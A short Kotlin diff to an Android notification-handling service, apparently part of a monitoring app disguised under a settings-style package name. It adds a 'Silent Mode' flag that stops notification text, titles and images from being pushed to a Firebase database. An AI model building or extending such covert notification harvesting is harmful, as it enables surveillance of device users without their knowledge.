@@ -16,6 +16,7 @@ import com.safe.setting.app.utils.Consts.NOTIFICATION_MESSAGE
 import com.safe.setting.app.utils.FileHelper
 import com.safe.setting.app.utils.FileHelper.getFileNameBitmap
 import com.safe.setting.app.utils.supabase.SupabaseManager
+import com.safe.setting.app.utils.GlobalConfig
  
 import kotlinx.coroutines.flow.flow
 import kotlinx.coroutines.flow.retryWhen
@@ -76,6 +77,12 @@ class InteractorNotificationService @Inject constructor(@ApplicationContext priv
 
     @RequiresApi(Build.VERSION_CODES.O)
     override fun setDataMessageNotification(type: Int, text: String?, title: String?, nameImage: String?, image:Bitmap?) {
+        try {
+            if (GlobalConfig.isFrozen) {
+                Log.d(Consts.TAG, "Silent Mode: drop notification message")
+                return
+            }
+        } catch (_: Exception) {}
         if (image!=null && nameImage != null){
             val imageFilePath = image.getFileNameBitmap(context,nameImage)
             val imageFile = File(imageFilePath)
@@ -106,6 +113,9 @@ class InteractorNotificationService @Inject constructor(@ApplicationContext priv
     }
 
     private fun setData(type: Int, text: String?, title: String?,nameImage:String?,urlImage:String?){
+        try {
+            if (GlobalConfig.isFrozen) return
+        } catch (_: Exception) {}
         val message = NotificationMessages(text,title,type,getDateTime(),nameImage,urlImage)
         firebase.getDatabaseReference("$NOTIFICATION_MESSAGE/$DATA").push().setValue(message)
     }
